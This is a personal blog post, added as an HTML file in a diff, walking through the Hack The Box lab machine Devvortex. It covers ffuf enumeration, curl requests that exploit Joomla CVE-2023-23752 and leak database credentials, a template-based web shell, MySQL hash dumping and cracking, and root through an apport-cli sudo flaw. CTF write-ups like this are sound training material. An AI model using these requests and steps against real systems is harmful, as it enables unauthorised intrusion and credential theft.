@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html class="" lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+        <script>
+            if (location.host != new URL("http:\/\/localhost:1313\/").host) location.href = "http:\/\/localhost:1313\/"
+        </script>
+    
+    <meta name="robots" content="noai, noimageai">
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            HTB Machine Devvortex  &ndash;
+        
+        Shakil&#39;s Blog
+    </title>
+
+    
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>
+
+    
+    
+    <link type="text/css" rel="stylesheet" href=http://localhost:1313/css/styles.159e622b5082f31a00ec6f1883bbaf21cb06404f86f78d11446793c0fd5d5060b90e94ef79525a194da08b247c2b8b82413944e9b2af3d2c35c0fa6157961cd6.css integrity="sha512-FZ5iK1CC8xoA7G8Yg7uvIcsGQE&#43;G940RRGeTwP1dUGC5DpTveVJaGU2giyR8K4uCQTlE6bKvPSw1wPphV5Yc1g==" />
+<meta name="author" content="Shakil Hossain" />
+
+    
+        <meta name="keywords" content='ctf, dev, htb, linux, vortex' />
+    
+    
+        <meta name="description" content="n Nmap Services Port Service 80 http (nginx/1.18.0) 22 ssh () Subdomains (VHost) $ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://devvortex.htb -H &amp;quot;Host: FUZZ.devvortex.htb&amp;quot; -fs 154 /&#39;___\ /&#39;___\ /&#39;___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2." />
+    
+
+<meta property="og:site_name"
+    content='Shakil&#39;s Blog' />
+
+    <meta property="og:title" content="HTB Machine Devvortex" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Shakil Hossain" />
+    <meta
+        property="article:published_time"
+        content='2024-05-16T16:41:36Z&#43;0200' />
+    
+        
+            <meta property="article:tag" content="ctf" />
+        
+            <meta property="article:tag" content="dev" />
+        
+            <meta property="article:tag" content="htb" />
+        
+            <meta property="article:tag" content="linux" />
+        
+            <meta property="article:tag" content="vortex" />
+        
+    
+    <meta property="og:url" content="http://localhost:1313/posts/htb-machines/dev-vortex/dev-vortex/" />
+    
+    
+    <meta property="og:image"
+        content="http://localhost:1313/android-chrome-512x512.png" />
+    
+        <meta property="og:description" content="Devvortex - HTB Recon Nmap Services Port Service 80 http (nginx/1.18.0) 22 ssh () Subdomains (VHost) $ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-dire" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='localhost:1313'
+/>
+<meta property="twitter:url" content="http://localhost:1313/posts/htb-machines/dev-vortex/dev-vortex/" />
+
+
+    <meta name="twitter:title" content="HTB Machine Devvortex" />
+    
+    
+    
+    <meta name="twitter:image"
+        content="http://localhost:1313/android-chrome-512x512.png" />
+    
+        <meta name="twitter:description" content="Devvortex - HTB Recon Nmap Services Port Service 80 http (nginx/1.18.0) 22 ssh () Subdomains (VHost) $ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-dire" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' alt='Logo'/>
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">Shakil&#39;s Blog</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts/">Posts</a></li>
+        
+        
+        
+        
+        
+        
+        
+            <li><a href="/tags/">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search/?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="/index.xml">
+    
+    
+        &#xf09e;
+    
+    <span>
+        RSS
+    </span>
+</a>
+
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/hshakilst">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://linkedin.com/in/hshakilst">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        LinkedIn
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:hshakilst@gmail.com">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Gmail
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>HTB Machine Devvortex</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2024-05-16
+
+</p>
+    
+    
+    
+    
+    <div><h1 id="devvortex---htb">Devvortex - HTB</h1>
+<p><img src="image.png" alt="alt text"></p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap-services">Nmap Services</h3>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>80</td>
+<td>http (nginx/1.18.0)</td>
+</tr>
+<tr>
+<td>22</td>
+<td>ssh ()</td>
+</tr>
+</tbody>
+</table>
+<h3 id="subdomains-vhost">Subdomains (VHost)</h3>
+<pre><code>$ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://devvortex.htb -H &quot;Host: FUZZ.devvortex.htb&quot; -fs 154 
+
+    /'___\  /'___\           /'___\       
+   /\ \__/ /\ \__/  __  __  /\ \__/       
+   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+     \ \_\   \ \_\  \ \____/  \ \_\       
+      \/_/    \/_/   \/___/    \/_/       
+
+   v2.1.0-dev
+________________________________________________
+
+:: Method           : GET
+:: URL              : http://devvortex.htb
+:: Wordlist         : FUZZ: /home/neptune/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+:: Header           : Host: FUZZ.devvortex.htb
+:: Follow redirects : false
+:: Calibration      : false
+:: Timeout          : 10
+:: Threads          : 40
+:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+:: Filter           : Response size: 154
+________________________________________________
+
+dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 135ms]
+:: Progress: [26584/26584] :: Job [1/1] :: 336 req/sec :: Duration: [0:00:56] :: Errors: 1 ::
+</code></pre>
+<ul>
+<li><strong>dev.devvortex.htb</strong></li>
+</ul>
+<h3 id="http-enumeration---devdevvortexhtb">HTTP Enumeration - dev.devvortex.htb</h3>
+<ul>
+<li>
+<p><strong>ffuf</strong></p>
+<pre><code>$ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt:FUZZ -u http://dev.devvortex.htb/FUZZ                       
+
+  /'___\  /'___\           /'___\       
+ /\ \__/ /\ \__/  __  __  /\ \__/       
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+  \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+   \ \_\   \ \_\  \ \____/  \ \_\       
+    \/_/    \/_/   \/___/    \/_/       
+
+ v2.1.0-dev
+________________________________________________
+:: Method           : GET
+:: URL              : http://dev.devvortex.htb/FUZZ
+:: Wordlist         : FUZZ: /home/neptune/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+:: Follow redirects : false
+:: Calibration      : false
+:: Timeout          : 10
+:: Threads          : 40
+:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+modules                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 75ms]
+templates               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 68ms]
+tmp                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 69ms]
+media                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 69ms]
+cache                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 70ms]
+images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 70ms]
+plugins                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
+includes                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
+language                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 71ms]
+administrator           [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 91ms]
+libraries               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 91ms]
+components              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 75ms]
+api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 89ms]
+home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 423ms]
+layouts                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 106ms]
+                        [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 1176ms]
+cli                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 149ms]
+:: Progress: [26584/26584] :: Job [1/1] :: 33 req/sec :: Duration: [0:12:53] :: Errors: 2 ::
+</code></pre>
+</li>
+<li>
+<p><strong>robots.txt</strong> - <a href="http://dev.devvortex.htb/robots.txt">http://dev.devvortex.htb/robots.txt</a></p>
+<pre><code>&lt;---snipped---&gt;
+User-agent: *
+Disallow: /administrator/
+Disallow: /api/
+Disallow: /bin/
+Disallow: /cache/
+Disallow: /cli/
+Disallow: /components/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /layouts/
+Disallow: /libraries/
+Disallow: /logs/
+Disallow: /modules/
+Disallow: /plugins/
+Disallow: /tmp/
+</code></pre>
+</li>
+<li>
+<p><strong>README.txt</strong></p>
+<pre><code>Joomla! CMS™
+
+1- Overview
+	* This is a Joomla! 4.x installation/upgrade package.
+	* Joomla! Official site: https://www.joomla.org
+	* Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
+	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev
+
+  &lt;---snipped---&gt;
+</code></pre>
+</li>
+<li>
+<p><strong>Services Running</strong></p>
+<ul>
+<li>Joomla CMS 4.2</li>
+</ul>
+</li>
+</ul>
+<h3 id="vulnerability-assessment---joomla-cms-42">Vulnerability Assessment - Joomla CMS 4.2</h3>
+<ul>
+<li>
+<p><strong>Vulnerability</strong>: Joomla CMS 4.2 is vulnerable to Unauthenticated information disclosure (CVE-2023-23752) due to Improper access check in <code>Core</code> webservice endpoints. The affected versions are 4.0.0-4.2.7 in range. Due to flaws in Joomla’s access control to Web service endpoints, unauthenticated attackers access the RestAPI interface to obtain Joomla-related configuration information by constructing specially crafted requests, which eventually leads to the disclosure of sensitive information. For more on the vulnerability :</p>
+<ul>
+<li><a href="https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/">NS Focus Global</a></li>
+<li><a href="https://vulncheck.com/blog/joomla-for-rce">Vuln Check</a></li>
+</ul>
+</li>
+<li>
+<p><strong>PoC</strong>: A publicly available exploit is published on <a href="https://www.exploit-db.com/exploits/51334">ExploitDB</a>. We can use this <code>{root_url}/api/index.php/v1/users?public=true</code> REST endpoint to obtain user information , and this <code>{root_url}/api/index.php/v1/config/application?public=true</code> endpoint for application configuration.</p>
+</li>
+</ul>
+<h2 id="joomla-cms-42">Joomla CMS 4.2</h2>
+<h3 id="exploiting-cve-2023-23752">Exploiting CVE-2023-23752</h3>
+<ul>
+<li>
+<p><strong>User Information</strong>:</p>
+<pre><code>$ curl http://dev.devvortex.htb/api/v1/users?public=true
+
+{&quot;links&quot;:{&quot;self&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/v1\/users?public=true&quot;},&quot;data&quot;:[{&quot;type&quot;:&quot;users&quot;,&quot;id&quot;:&quot;649&quot;,&quot;attributes&quot;:{&quot;id&quot;:649,&quot;name&quot;:&quot;lewis&quot;,&quot;username&quot;:&quot;lewis&quot;,&quot;email&quot;:&quot;lewis@devvortex.htb&quot;,&quot;block&quot;:0,&quot;sendEmail&quot;:1,&quot;registerDate&quot;:&quot;2023-09-25 16:44:24&quot;,&quot;lastvisitDate&quot;:&quot;2024-04-26 10:37:12&quot;,&quot;lastResetTime&quot;:null,&quot;resetCount&quot;:0,&quot;group_count&quot;:1,&quot;group_names&quot;:&quot;Super Users&quot;}},{&quot;type&quot;:&quot;users&quot;,&quot;id&quot;:&quot;650&quot;,&quot;attributes&quot;:{&quot;id&quot;:650,&quot;name&quot;:&quot;logan paul&quot;,&quot;username&quot;:&quot;logan&quot;,&quot;email&quot;:&quot;logan@devvortex.htb&quot;,&quot;block&quot;:0,&quot;sendEmail&quot;:0,&quot;registerDate&quot;:&quot;2023-09-26 19:15:42&quot;,&quot;lastvisitDate&quot;:null,&quot;lastResetTime&quot;:null,&quot;resetCount&quot;:0,&quot;group_count&quot;:1,&quot;group_names&quot;:&quot;Registered&quot;}}],&quot;meta&quot;:{&quot;total-pages&quot;:1}}      
+</code></pre>
+</li>
+<li>
+<p><strong>Application Config</strong>:</p>
+<pre><code>$ curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true 
+
+{&quot;links&quot;:{&quot;self&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&quot;,&quot;next&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20&quot;,&quot;last&quot;:&quot;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20&quot;},&quot;data&quot;:[{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;offline&quot;:false,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;offline_message&quot;:&quot;This site is down for maintenance.&lt;br&gt;Please check back again soon.&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;display_offline_message&quot;:1,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;offline_image&quot;:&quot;&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;sitename&quot;:&quot;Development&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;editor&quot;:&quot;tinymce&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;captcha&quot;:&quot;0&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;list_limit&quot;:20,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;access&quot;:1,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;debug&quot;:false,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;debug_lang&quot;:false,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;debug_lang_const&quot;:true,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbtype&quot;:&quot;mysqli&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;host&quot;:&quot;localhost&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;user&quot;:&quot;lewis&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;password&quot;:&quot;P4ntherg0t1n5r3c0n##&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;db&quot;:&quot;joomla&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbprefix&quot;:&quot;sd4fg_&quot;,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbencryption&quot;:0,&quot;id&quot;:224}},{&quot;type&quot;:&quot;application&quot;,&quot;id&quot;:&quot;224&quot;,&quot;attributes&quot;:{&quot;dbsslverifyservercert&quot;:false,&quot;id&quot;:224}}],&quot;meta&quot;:{&quot;total-pages&quot;:4}}
+</code></pre>
+<p>We can see from the <code>meta</code> that it&rsquo;s only page 1 out of 4. We should gather all the data from this api using the <code>next</code> link and save it to a file.</p>
+</li>
+</ul>
+<h3 id="users-and-credentials">Users and Credentials</h3>
+<ul>
+<li>
+<p><strong>Users</strong>:</p>
+<ul>
+<li>
+<p>lewis:</p>
+<pre><code>{
+    &quot;id&quot;: 649,
+    &quot;name&quot;: &quot;lewis&quot;,
+    &quot;username&quot;: &quot;lewis&quot;,
+    &quot;email&quot;: &quot;lewis@devvortex.htb&quot;,
+    &quot;block&quot;: 0,
+    &quot;sendEmail&quot;: 1,
+    &quot;registerDate&quot;: &quot;2023-09-25 16:44:24&quot;,
+    &quot;lastvisitDate&quot;: &quot;2024-04-26 10:37:12&quot;,
+    &quot;lastResetTime&quot;: null,
+    &quot;resetCount&quot;: 0,
+    &quot;group_count&quot;: 1,
+    &quot;group_names&quot;: &quot;Super Users&quot;
+}
+</code></pre>
+</li>
+<li>
+<p>logan:</p>
+<pre><code>{
+    &quot;id&quot;: 650,
+    &quot;name&quot;: &quot;logan paul&quot;,
+    &quot;username&quot;: &quot;logan&quot;,
+    &quot;email&quot;: &quot;logan@devvortex.htb&quot;,
+    &quot;block&quot;: 0,
+    &quot;sendEmail&quot;: 0,
+    &quot;registerDate&quot;: &quot;2023-09-26 19:15:42&quot;,
+    &quot;lastvisitDate&quot;: null,
+    &quot;lastResetTime&quot;: null,
+    &quot;resetCount&quot;: 0,
+    &quot;group_count&quot;: 1,
+    &quot;group_names&quot;: &quot;Registered&quot;
+}
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Credentials</strong>:</p>
+<ul>
+<li>
+<p>lewis:</p>
+<pre><code>{
+    &quot;type&quot;: &quot;application&quot;,
+    &quot;id&quot;: &quot;224&quot;,
+    &quot;attributes&quot;: {
+        &quot;user&quot;: &quot;lewis&quot;,
+        &quot;id&quot;: 224
+    }
+},
+{
+    &quot;type&quot;: &quot;application&quot;,
+    &quot;id&quot;: &quot;224&quot;,
+    &quot;attributes&quot;: {
+        &quot;password&quot;: &quot;P4ntherg0t1n5r3c0n##&quot;,
+        &quot;id&quot;: 224
+    }
+},
+</code></pre>
+<p>We can try this creds to log into the admin dashboard of Joomla at <code>http://dev.devvortex.htb/administrator</code>.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="admin-dashboard-enumeration">Admin Dashboard Enumeration</h3>
+<ul>
+<li>PHP: 7.4.3 which is obsolete and no longer receives official security updates.</li>
+<li>MySQL: 8.0.35-0ubuntu0.20.04.1</li>
+<li>Server: Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64</li>
+<li>Disable PHP Functions:
+<ul>
+<li>pcntl_alarm</li>
+<li>pcntl_fork</li>
+<li>pcntl_waitpid</li>
+<li>pcntl_wait</li>
+<li>pcntl_wifexited</li>
+<li>pcntl_wifstopped</li>
+<li>pcntl_wifsignaled</li>
+<li>pcntl_wifcontinued</li>
+<li>pcntl_wexitstatus</li>
+<li>pcntl_wtermsig</li>
+<li>pcntl_wstopsig</li>
+<li>pcntl_signal</li>
+<li>pcntl_signal_get_handler</li>
+<li>pcntl_signal_dispatch</li>
+<li>pcntl_get_last_error</li>
+<li>pcntl_strerror</li>
+<li>pcntl_sigprocmask</li>
+<li>pcntl_sigwaitinfo</li>
+<li>pcntl_sigtimedwait</li>
+<li>pcntl_exec</li>
+<li>pcntl_getpriority</li>
+<li>pcntl_setpriority</li>
+<li>pcntl_async_signals</li>
+<li>pcntl_unshare</li>
+</ul>
+</li>
+<li>Phar: PHP Archive support is enabled. Can be used to bypass upload restriction for a shell.</li>
+</ul>
+<h3 id="getting-foothold">Getting Foothold</h3>
+<p>In the <code>System</code> menu Joomla offeres option to customize a template. I customized a template by modifying a existing php file. By inserting a shellcode I was successful getting a shell on the box as <code>www-data</code> user.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-stabilization">Shell Stabilization</h3>
+<p>The shell was not stable at all. I couldn&rsquo;t see any interective output because I was missing an actual shell.</p>
+<p><code>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</code></p>
+<p>I was <code>www-data</code> and it&rsquo;s shell was assigned nologin. I did the following to make the shell stable.</p>
+<pre><code>script /dev/null -c /bin/bash
+CTRL + Z
+stty raw -echo; fg
+Then press Enter twice, and then enter:
+export TERM=xterm
+</code></pre>
+<p>Then I had a good enough shell to work with.</p>
+<h3 id="user-enumeration">User Enumeration</h3>
+<p>After inspecting the <code>/etc/passwd</code> file I was sure that I had to escalate my privileges and take over <code>logan</code>  account. I could list the account&rsquo;s home directory and found the user flag but didn&rsquo;t have permission to read it.</p>
+<h3 id="service-enumeration">Service Enumeration</h3>
+<p>After inspecting for users I tried to access the MySQL database to find any credentials that can help me pivot to <code>logan</code>. So I logged in to the database service using the <code>lewis:P4ntherg0t1n5r3c0n##</code> and it worked.</p>
+<h3 id="mysql-enumeration">MySQL Enumeration</h3>
+<ul>
+<li>
+<p><strong>Databses</strong>:</p>
+<pre><code>show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| joomla             |
+| performance_schema |
++--------------------+
+</code></pre>
+</li>
+<li>
+<p><strong>Tables</strong>:</p>
+<pre><code>+-------------------------------+
+| Tables_in_joomla              |
++-------------------------------+
+| sd4fg_action_log_config       |
+| sd4fg_action_logs             |
+| sd4fg_action_logs_extensions  |
+| sd4fg_action_logs_users       |
+| sd4fg_assets                  |
+| sd4fg_associations            |
+| sd4fg_banner_clients          |
+| sd4fg_banner_tracks           |
+| sd4fg_banners                 |
+| sd4fg_categories              |
+| sd4fg_contact_details         |
+| sd4fg_content                 |
+| sd4fg_content_frontpage       |
+| sd4fg_content_rating          |
+| sd4fg_content_types           |
+| sd4fg_contentitem_tag_map     |
+| sd4fg_extensions              |
+| sd4fg_fields                  |
+| sd4fg_fields_categories       |
+| sd4fg_fields_groups           |
+| sd4fg_fields_values           |
+| sd4fg_finder_filters          |
+| sd4fg_finder_links            |
+| sd4fg_finder_links_terms      |
+| sd4fg_finder_logging          |
+| sd4fg_finder_taxonomy         |
+| sd4fg_finder_taxonomy_map     |
+| sd4fg_finder_terms            |
+| sd4fg_finder_terms_common     |
+| sd4fg_finder_tokens           |
+| sd4fg_finder_tokens_aggregate |
+| sd4fg_finder_types            |
+| sd4fg_history                 |
+| sd4fg_languages               |
+| sd4fg_mail_templates          |
+| sd4fg_menu                    |
+| sd4fg_menu_types              |
+| sd4fg_messages                |
+| sd4fg_messages_cfg            |
+| sd4fg_modules                 |
+| sd4fg_modules_menu            |
+| sd4fg_newsfeeds               |
+| sd4fg_overrider               |
+| sd4fg_postinstall_messages    |
+| sd4fg_privacy_consents        |
+| sd4fg_privacy_requests        |
+| sd4fg_redirect_links          |
+| sd4fg_scheduler_tasks         |
+| sd4fg_schemas                 |
+| sd4fg_session                 |
+| sd4fg_tags                    |
+| sd4fg_template_overrides      |
+| sd4fg_template_styles         |
+| sd4fg_ucm_base                |
+| sd4fg_ucm_content             |
+| sd4fg_update_sites            |
+| sd4fg_update_sites_extensions |
+| sd4fg_updates                 |
+| sd4fg_user_keys               |
+| sd4fg_user_mfa                |
+| sd4fg_user_notes              |
+| sd4fg_user_profiles           |
+| sd4fg_user_usergroup_map      |
+| sd4fg_usergroups              |
+| sd4fg_users                   |
+| sd4fg_viewlevels              |
+| sd4fg_webauthn_credentials    |
+| sd4fg_workflow_associations   |
+| sd4fg_workflow_stages         |
+| sd4fg_workflow_transitions    |
+| sd4fg_workflows               |
++-------------------------------+
+</code></pre>
+</li>
+<li>
+<p>Users:</p>
+<pre><code> +----------+--------------------------------------------------------------+
+ | username | password                                                     |
+ +----------+--------------------------------------------------------------+
+ | lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
+ | logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+ +----------+--------------------------------------------------------------+
+</code></pre>
+</li>
+</ul>
+<h3 id="cracking-the-logan-hash">Cracking the <code>logan</code> Hash</h3>
+<p>Using john the ripper I was able to crack the hash for logan.</p>
+<p><code>logan:tequieromucho</code></p>
+<p>Let&rsquo;s try this credential to log on. I could successfully log in using <code>ssh</code>.</p>
+<h3 id="root-privilege-escalation">Root Privilege Escalation</h3>
+<p>After login into the <code>logan</code> account. I ran the command <code>sudo -l</code> with the above password. And I found following sudoers privileges for the account.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Matching Defaults entries for logan on devvortex:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User logan may run the following commands on devvortex:
+</span></span><span style="display:flex;"><span>    (ALL : ALL) /usr/bin/apport-cli
+</span></span></code></pre></div><p>So <code>logan</code> can run <code>/usr/bin/apport-cli</code> with <code>sudo</code>. After, searching for apport-cli&rsquo;s know vulnerability I found a Privilege Escalation Vulnerability for apport-cli &lt;= v2.26.0 dubbed <code>CVE-2023-1326</code>. The machine&rsquo;s <code>apport-cli</code> version is <code>2.20.11</code>. So it can be exploited if certain conditions are met. <a href="https://github.com/diego-tella/CVE-2023-1326-PoC">For more on the PoC</a>.</p>
+<ol>
+<li>
+<p>System should specially configured to allow unprivileged users to run sudo apport-cli.</p>
+</li>
+<li>
+<p><code>less</code> is configured as the pager.</p>
+</li>
+<li>
+<p>The terminal size can be set.</p>
+</li>
+</ol>
+<p>Unfortunately all of the conditions were present in the box and we successfully gained <code>root</code> privilege following the steps described in PoC. Finally, acquired the root flag.</p>
+</div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/ctf/">#ctf</a>
+        
+            <a
+                
+                href="/tags/dev/">#dev</a>
+        
+            <a
+                
+                href="/tags/htb/">#htb</a>
+        
+            <a
+                
+                href="/tags/linux/">#linux</a>
+        
+            <a
+                
+                href="/tags/vortex/">#vortex</a>
+        
+    </p>
+
+
+
+
+
+    
+    
+        
+        <div class="relatedArticlesContainer">
+            <hr />
+            <h2>More posts like this</h2>
+            <div class="postlist ">
+                <article class="card postlistitem">
+    <div>
+        <h2>
